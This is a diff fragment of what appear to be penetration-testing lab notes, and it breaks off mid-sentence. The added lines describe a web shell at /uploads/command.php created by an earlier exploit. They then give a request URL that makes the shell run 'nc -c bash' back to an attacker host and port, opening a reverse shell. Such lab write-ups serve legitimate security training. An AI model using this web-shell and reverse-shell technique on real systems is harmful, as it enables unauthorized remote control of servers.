@@ -277,4 +277,11 @@ run()
             
 ```
 
+After running this exploit we should have created the /uploads/command.php endpoint which allows us to execute code on the server. We can use the following request to gain a reverse shell:
+`https://192.168.197.44/uploads/command.php?cmd=nc%20-c%20bash%20192.168.119.197%209000`
+
+
+
 **3.  Replicate the scenario demonstrated above using your dedicated clients.**
+
+Once we have a reverse shell 
